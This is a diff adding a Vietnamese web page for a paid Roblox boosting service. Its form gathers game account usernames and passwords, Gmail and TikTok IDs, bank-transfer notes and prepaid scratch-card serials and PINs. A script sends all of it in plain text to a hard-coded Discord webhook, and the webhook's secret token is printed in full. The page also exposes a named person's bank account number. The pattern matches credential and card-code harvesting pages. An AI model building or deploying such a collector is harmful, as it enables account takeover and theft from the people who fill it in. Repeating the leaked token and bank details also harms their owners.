@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <title>CÀY THUÊ ROBLOX</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <style>
+    body {
+      margin: 0;
+      padding: 2vh 2vw;
+      overflow-x: hidden;
+      background: #0a0a1a;
+      color: #0ff;
+      font-family: monospace;
+      min-height: 100vh;
+      box-sizing: border-box;
+    }
+
+    button, input, textarea {
+      display: block;
+      margin: 1.5vh 0;
+      padding: 1.5vh 2vw;
+      font-size: clamp(14px, 2.5vw, 16px);
+      width: 100%;
+      max-width: 500px;
+      border: 1px solid #0ff;
+      background: rgba(0, 255, 255, 0.1);
+      color: #0ff;
+      border-radius: 4px;
+    }
+
+    textarea {
+      width: 100%;
+      height: 15vh;
+      min-height: 120px;
+      font-family: monospace;
+      resize: vertical;
+    }
+
+    pre { 
+      white-space: pre-wrap;
+      font-size: clamp(12px, 2vw, 14px);
+      margin: 2vh 0;
+      overflow-x: auto;
+      max-width: 100%;
+    }
+
+    .hidden { display: none; }
+
+    /* Giữ nguyên phần CSS cho bầu trời sao */
+    .night {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(to bottom, #000000 0%, #0a0a1a 100%);
+      z-index: 0;
+    }
+
+    .stars {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+    }
+
+    .star {
+      position: absolute;
+      background: white;
+      border-radius: 50%;
+      animation: twinkle var(--duration) infinite ease-in-out;
+      opacity: 0;
+    }
+
+    @keyframes twinkle {
+      0%, 100% { opacity: 0.2; }
+      50% { opacity: 1; }
+    }
+
+    .shooting_star {
+      position: absolute;
+      width: 4px;
+      height: 4px;
+      background: #fff;
+      border-radius: 50%;
+      box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.1),
+                  0 0 0 8px rgba(255, 255, 255, 0.1),
+                  0 0 20px rgba(255, 255, 255, 1);
+      animation: shooting 3s linear infinite;
+      z-index: 0;
+    }
+
+    .shooting_star::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 0;
+      height: 1px;
+      background: linear-gradient(90deg, rgba(255, 255, 255, 1), transparent);
+      animation: tailGrow 1s linear forwards;
+    }
+
+    @keyframes shooting {
+      0% { transform: rotate(215deg) translateX(0); opacity: 1; }
+      70% { opacity: 1; }
+      100% { transform: rotate(215deg) translateX(-1000px); opacity: 0; }
+    }
+
+    @keyframes tailGrow {
+      0% { width: 0; opacity: 0; }
+      30% { width: 200px; opacity: 1; }
+      70% { width: 270px; opacity: 1; }
+      100% { width: 300px; opacity: 1; }
+    }
+
+    .shooting_star:nth-child(1) { top: 10%; left: 20%; animation-delay: 0s; }
+    .shooting_star:nth-child(2) { top: 15%; left: 80%; animation-delay: 1s; }
+    .shooting_star:nth-child(3) { top: 30%; left: 40%; animation-delay: 2s; }
+    .shooting_star:nth-child(4) { top: 50%; left: 60%; animation-delay: 3s; }
+    .shooting_star:nth-child(5) { top: 70%; left: 30%; animation-delay: 4s; }
+    .shooting_star:nth-child(6) { top: 80%; left: 70%; animation-delay: 5s; }
+    .shooting_star:nth-child(7) { top: 25%; left: 10%; animation-delay: 6s; }
+    .shooting_star:nth-child(8) { top: 45%; left: 90%; animation-delay: 7s; }
+    .shooting_star:nth-child(9) { top: 65%; left: 50%; animation-delay: 8s; }
+    .shooting_star:nth-child(10) { top: 35%; left: 75%; animation-delay: 9s; }
+    .shooting_star:nth-child(11) { top: 45%; left: 10%; animation-delay: 3s; }
+    .shooting_star:nth-child(12) { top: 25%; left: 90%; animation-delay: 5s; }
+    .shooting_star:nth-child(13) { top: 15%; left: 50%; animation-delay: 7s; }
+    .shooting_star:nth-child(14) { top: 30%; left: 75%; animation-delay: 1s; }
+
+    .form-container {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+
+    fieldset {
+      width: 100%;
+      max-width: 500px;
+      border: 2px solid #0ff;
+      padding: 15px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <!-- BẦU TRỜI SAO -->
+  <div class="night">
+    <div class="stars" id="stars"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+    <div class="shooting_star"></div>
+  </div>
+
+  <!-- FORM GỐC -->
+  <div class="form-container">
+    <pre>
+████████████████████████████████
+█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+█     CÀY THUÊ ROBLOX          █
+█ HỖ TRỢ:HOÀNG NGUYỄN(DUOHOAG) █
+█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
+    </pre>
+    <div id="form-step1">
+      <h3>MENU CHỌN GAME</h3>
+      <button onclick="chooseGame('Blox Fruit')">Blox Fruit</button>
+      <button onclick="chooseGame('Dead Raise')">Dead Raise</button>
+      <button onclick="support()">HỖ TRỢ</button>
+    </div>
+
+    <div id="form-step2" class="hidden">
+      <h2 id="game-title">CÀY THUÊ</h2>
+      <pre id="price"></pre>
+      <textarea id="noidung" placeholder="Nhập nội dung đơn cày thuê"></textarea>
+      <button onclick="toStep3()">Tiếp tục ➡️</button>
+      <button onclick="backToStep1()">↩️ Quay lại</button>
+    </div>
+
+    <div id="form-step3" class="hidden">
+      <h2>Chọn phương thức thanh toán</h2>
+      <button onclick="showATM()">Thanh Toán ATM 'RẺ HƠN'</button>
+      <button onclick="showCard()">Thanh Toán Thẻ Cào 'THÊM 10K'</button>
+      <button onclick="backToStep2()">↩️ Quay lại</button>
+    </div>
+
+    <div id="form-step4" class="hidden">
+      <h2>Thông tin thanh toán ATM / Bank</h2>
+      <fieldset style="border: 2px solid #0ff; padding: 15px; margin-bottom: 20px;">
+        <legend>ATM/Bank.🏧MB-BANK : 0934755165🏧. Nguyễn Ngọc Huy Hoàng</legend>
+        <input id="bank_note" placeholder="Nội dung Bank hoặc ghi Duohoag" style="width: 90%">
+        <input id="bank_time" placeholder="Thời gian Bank" style="width: 90%">
+      </fieldset>
+      <button onclick="goToStep5('atm')">Tiếp tục ➡️</button>
+      <button onclick="backToStep3()">↩️ Quay lại</button>
+    </div>
+
+    <div id="form-step5" class="hidden">
+      <h2>Thông tin Thẻ Cào</h2>
+     <pre>
+       ╔══════════════════════════════╗
+       ║    BẢNG CHIẾT KHẤU THẺ       ║
+       ╠══════════════════════════════╣
+       ║ MỆNH GIÁ  │  NHẬN  │  MẠNG   ║
+       ╠══════════════════════════════╣
+       ║ 20,000đ   │ 14,000đ │ Viettel║
+       ║ 20,000đ   │ 14,000đ │ Mobi   ║
+       ║ 20,000đ   │ 14,000đ │ Garena ║
+       ╠──────────────────────────────╣
+       ║ 30,000đ   │ 23,000đ │ Viettel║
+       ║ 30,000đ   │ 20,000đ │ Mobi   ║
+       ║ 30,000đ   │   x     │ Garena ║
+       ╠──────────────────────────────╣
+       ║ 50,000đ   │ 40,000đ │ Viettel║
+       ║ 50,000đ   │ 40,000đ │ Mobi   ║
+       ║ 50,000đ   │ 40,000đ │ Garena ║
+       ╠──────────────────────────────╣
+       ║100,000đ   │ 80,000đ │ Viettel║
+       ║100,000đ   │ 80,000đ │ Mobi   ║
+       ║100,000đ   │ 80,000đ │ Garena ║
+       ╠──────────────────────────────╣
+       ║200,000đ   │170,000đ │ Viettel║
+       ║200,000đ   │160,000đ │ Mobi   ║
+       ║200,000đ   │175,000đ │ Garena ║
+       ╚══════════════════════════════╝
+     </pre>
+      <fieldset style="border: 2px solid #0ff; padding: 15px; margin-bottom: 20px;">
+        <legend>Chọn Thẻ & Mệnh Giá</legend>
+        <label for="card_count">Số lượng thẻ:</label>
+        <select id="card_count" onchange="updateCardInputs()">
+          <option value="1">1 Thẻ</option>
+          <option value="2">2 Thẻ</option>
+          <option value="3">3 Thẻ</option>
+        </select>
+        <label for="card_type">Loại Thẻ:</label>
+        <select id="card_type">
+          <option value="">-- Chọn Thẻ --</option>
+          <option value="Viettel">Viettel</option>
+          <option value="Mobifone">Mobifone</option>
+          <option value="Garena">Garena</option>
+        </select>
+      </fieldset>
+
+      <fieldset style="border: 2px solid #0ff; padding: 15px; margin-bottom: 20px;">
+        <legend>Nhập Thông Tin Thẻ Cào</legend>
+        <label for="card_amount">Mệnh Giá 1:</label>
+        <select id="card_amount">
+          <option value="">-- Chọn Mệnh Giá --</option>
+          <option value="10,000đ">10,000đ</option>
+          <option value="20,000đ">20,000đ</option>
+          <option value="30,000đ">30,000đ</option>
+          <option value="50,000đ">50,000đ</option>
+          <option value="100,000đ">100,000đ</option>
+          <option value="200,000đ">200,000đ</option>
+        </select>
+        <input id="seri" placeholder="Seri Card 1" style="width: 90%">
+        <input id="ma" placeholder="Mã Card 1" style="width: 90%">
+
+        <div id="card2" class="hidden">
+          <label for="card_amount2">Mệnh Giá 2:</label>
+          <select id="card_amount2">
+            <option value="">-- Chọn Mệnh Giá --</option>
+            <option value="10,000đ">10,000đ</option>
+            <option value="20,000đ">20,000đ</option>
+            <option value="30,000đ">30,000đ</option>
+            <option value="50,000đ">50,000đ</option>
+            <option value="100,000đ">100,000đ</option>
+            <option value="200,000đ">200,000đ</option>
+          </select>
+          <input id="seri2" placeholder="Seri Card 2" style="width: 90%">
+          <input id="ma2" placeholder="Mã Card 2" style="width: 90%">
+        </div>
+
+        <div id="card3" class="hidden">
+          <label for="card_amount3">Mệnh Giá 3:</label>
+          <select id="card_amount3">
+            <option value="">-- Chọn Mệnh Giá --</option>
+            <option value="10,000đ">10,000đ</option>
+            <option value="20,000đ">20,000đ</option>
+            <option value="30,000đ">30,000đ</option>
+            <option value="50,000đ">50,000đ</option>
+            <option value="100,000đ">100,000đ</option>
+            <option value="200,000đ">200,000đ</option>
+          </select>
+          <input id="seri3" placeholder="Seri Card 3" style="width: 90%">
+          <input id="ma3" placeholder="Mã Card 3" style="width: 90%">
+        </div>
+      </fieldset>
+
+      <button onclick="goToStep5('card')">Tiếp tục ➡️</button>
+      <button onclick="backToStep3()">↩️ Quay lại</button>
+    </div>
+
+    <div id="form-step6" class="hidden">
+      <fieldset style="border: 2px solid #0ff; padding: 15px; margin-bottom: 20px;">
+        <legend>Quy Tắc Khi Thuê</legend>
+        <pre>
+📌 LƯU Ý QUAN TRỌNG
+- Không đổi mật khẩu khi đang cày thuê!
+- Không đăng nhập tài khoản trong lúc đang cày!
+- Nếu đăng nhập khi cày sẽ hủy đơn ko hoàn trả tiền💵!
+- Không chia sẻ tài khoản cho người khác!
+- Chúng tôi sẽ check card đúng hay không rồi mới cày!
+- Cày xong mình sẽ ib bạn qua GMAIL & TIKTOK bạn đã cung cấp!
+⚠️ MỞ XÁC MINH 2 BƯỚC ĐỂ VÔ CÀY. KHÔNG MỞ TRỄ ĐƠN TỰ CHỊU ⚠️
+        </pre>
+      </fieldset>
+
+      <input id="tk" placeholder="Tài khoản">
+      <input id="mk" placeholder="Mật khẩu">
+      <input id="gmail" placeholder="Gmail liên hệ">
+      <input id="tiktok" placeholder="ID TikTok">
+
+      <button onclick="send()">✅ Gửi Thông Tin</button>
+      <button onclick="backToLast()">↩️ Quay lại</button>
+      <button onclick="backToStep1()">🏠 Trang Chủ</button>
+    </div>
+  </div>
+
+  <script>
+    const starsContainer = document.getElementById('stars');
+    for (let i = 0; i < 200; i++) {
+      const star = document.createElement('div');
+      star.className = 'star';
+      star.style.left = `${Math.random() * 100}%`;
+      star.style.top = `${Math.random() * 100}%`;
+      const size = Math.random() * 2 + 1;
+      star.style.width = `${size}px`;
+      star.style.height = `${size}px`;
+      star.style.setProperty('--duration', `${Math.random() * 3 + 2}s`);
+      star.style.animationDelay = `${Math.random() * 5}s`;
+      starsContainer.appendChild(star);
+    }
+
+    const webhook = 'https://discord.com/api/webhooks/1392122376191344740/xU5y5pXfQ_0Gmb1-jGTuBBVLMcQ77tdTDs-DPDRAZtQMDDiWASeiZ1t1tpM8rMsu4hWV';
+    let lastPaymentMethod = '';
+
+    // Xóa toàn bộ phần xử lý swipe cũ và thay bằng code mới
+    let startY;
+    const formContainer = document.querySelector('.form-container');
+
+    document.addEventListener('touchstart', function(e) {
+        startY = e.touches[0].clientY;
+    }, {passive: true});
+
+    document.addEventListener('touchmove', function(e) {
+        const y = e.touches[0].clientY;
+        const diff = startY - y;
+
+        // Cho phép cuộn tự nhiên
+        window.scrollBy(0, diff * 0.5);
+
+        startY = y;
+    }, {passive: true});
+
+    function chooseGame(game) {
+      window.selectedGame = game;
+      document.getElementById('form-step1').classList.add('hidden');
+      document.getElementById('form-step2').classList.remove('hidden');
+      document.getElementById('game-title').innerText = `CÀY THUÊ - ${game}`;
+      let priceText = '';
+      if (game === 'Blox Fruit') {
+        priceText = `
+╔══════════════════════════════════════╗
+║          BẢNG GIÁ - Blox Fruit       ║
+╠══════════════════════════════════════╣
+║ - Cày mastery: 50k / 1 mastery       ║
+║ - Cày level:   100k / 1 level        ║
+║ - Farm fruit:  200k / 1 trái         ║
+╚══════════════════════════════════════╝`;
+      } else if (game === 'Dead Raise') {
+        priceText = `
+╔════════════════════════════╗
+║    BẢNG GIÁ - Dead Raise   ║
+╠════════════════════════════╣
+║- 1WIN       : 2K           ║
+║- 1NVỤ       : 5K           ║
+║- GIFT CLASS : 5K / 1 CLASS ║
+║- FULL CLASS : 10K          ║
+║- GIFT TRAINS: 5K / 1 TRAINS║
+║- FULL TRAINS: 10K          ║
+║- 5K BOND    : 10K          ║
+║- 15K BOND   : 30K          ║
+║- 30K BOND   : 50K          ║
+╚════════════════════════════╝`;
+      }
+      document.getElementById('price').textContent = priceText;
+    }
+
+    function toStep3() {
+      const noidung = document.getElementById('noidung').value.trim();
+      if (!noidung) {
+        alert('Vui lòng nhập nội dung cày thuê!');
+        return;
+      }
+      document.getElementById('form-step2').classList.add('hidden');
+      document.getElementById('form-step3').classList.remove('hidden');
+    }
+
+    function showATM() {
+      document.getElementById('form-step3').classList.add('hidden');
+      document.getElementById('form-step4').classList.remove('hidden');
+    }
+
+    function showCard() {
+      document.getElementById('form-step3').classList.add('hidden');
+      document.getElementById('form-step5').classList.remove('hidden');
+    }
+
+    function goToStep5(method) {
+      lastPaymentMethod = method;
+      document.getElementById('form-step4').classList.add('hidden');
+      document.getElementById('form-step5').classList.add('hidden');
+      document.getElementById('form-step6').classList.remove('hidden');
+    }
+
+    function backToStep1() {
+      document.getElementById('form-step2').classList.add('hidden');
+      document.getElementById('form-step3').classList.add('hidden');
+      document.getElementById('form-step4').classList.add('hidden');
+      document.getElementById('form-step5').classList.add('hidden');
+      document.getElementById('form-step6').classList.add('hidden');
+      document.getElementById('form-step1').classList.remove('hidden');
+      document.getElementById('noidung').value = '';
+      document.getElementById('bank_note').value = '';
+      document.getElementById('bank_time').value = '';
+      document.getElementById('seri').value = '';
+      document.getElementById('ma').value = '';
+      document.getElementById('tk').value = '';
+      document.getElementById('mk').value = '';
+      document.getElementById('gmail').value = '';
+      document.getElementById('tiktok').value = '';
+      window.selectedGame = '';
+    }
+
+    function backToStep2() {
+      document.getElementById('form-step3').classList.add('hidden');
+      document.getElementById('form-step2').classList.remove('hidden');
+    }
+
+    function backToStep3() {
+      document.getElementById('form-step4').classList.add('hidden');
+      document.getElementById('form-step5').classList.add('hidden');
+      document.getElementById('form-step3').classList.remove('hidden');
+    }
+
+    function backToLast() {
+      document.getElementById('form-step6').classList.add('hidden');
+      if (lastPaymentMethod === 'atm') {
+        document.getElementById('form-step4').classList.remove('hidden');
+      } else if (lastPaymentMethod === 'card') {
+        document.getElementById('form-step5').classList.remove('hidden');
+      } else {
+        document.getElementById('form-step3').classList.remove('hidden');
+      }
+    }
+
+    function support() {
+      window.open('https://www.facebook.com/2007huyhoanghine', '_blank');
+    }
+
+    function updateCardInputs() {
+      const count = parseInt(document.getElementById('card_count').value);
+      document.getElementById('card2').classList.toggle('hidden', count < 2);
+      document.getElementById('card3').classList.toggle('hidden', count < 3);
+    }
+
+    function send() {
+      const noidung = document.getElementById('noidung').value;
+      const bank_note = document.getElementById('bank_note').value;
+      const bank_time = document.getElementById('bank_time').value;
+      const seri = document.getElementById('seri').value;
+      const ma = document.getElementById('ma').value;
+      const seri2 = document.getElementById('seri2') ? document.getElementById('seri2').value : '';
+      const ma2 = document.getElementById('ma2') ? document.getElementById('ma2').value : '';
+      const seri3 = document.getElementById('seri3') ? document.getElementById('seri3').value : '';
+      const ma3 = document.getElementById('ma3') ? document.getElementById('ma3').value : '';
+
+      const tk = document.getElementById('tk').value;
+      const mk = document.getElementById('mk').value;
+      const gmail = document.getElementById('gmail').value;
+      const tiktok = document.getElementById('tiktok').value;
+      const card_type = document.getElementById('card_type').value;
+      const card_amount = document.getElementById('card_amount').value;
+      const card_amount2 = document.getElementById('card_amount2') ? document.getElementById('card_amount2').value : '';
+      const card_amount3 = document.getElementById('card_amount3') ? document.getElementById('card_amount3').value : '';
+
+      const data = {
+        content: `🎮 **CÀY THUÊ - ${window.selectedGame}**
+    🖋 **Nội dung:** ${noidung}
+    💵 **Mệnh Giá 1:** ${card_amount}
+    🔍 **Seri 1:** ${seri} 
+    🔍 **Mã 1:** ${ma}
+    💵 **Mệnh Giá 2:** ${card_amount2}
+    🔍 **Seri 2:** ${seri2} 
+    🔍 **Mã 2:** ${ma2}
+    💵 **Mệnh Giá 3:** ${card_amount3}
+    🔍 **Seri 3:** ${seri3} 
+    🔍 **Mã 3:** ${ma3}
+    🔒 **Tài khoản:** ${tk}
+    🔒 **Mật khẩu:** ${mk}
+    📧 **Gmail:** ${gmail}
+    📱 **TikTok:** ${tiktok}
+    🏧 **Nội dung Bank:** ${bank_note}
+    ⏰ **Thời gian Bank:** ${bank_time}
+    🔖 **Loại Thẻ:** ${card_type}`
+      };
+
+      fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      }).then(() => {
+        alert('✅ Thông tin đã gửi về Discord!');
+      }).catch(err => {
+        alert('Lỗi gửi webhook: ' + err);
+      });
+    }
+  </script>
+</body>
+</html>
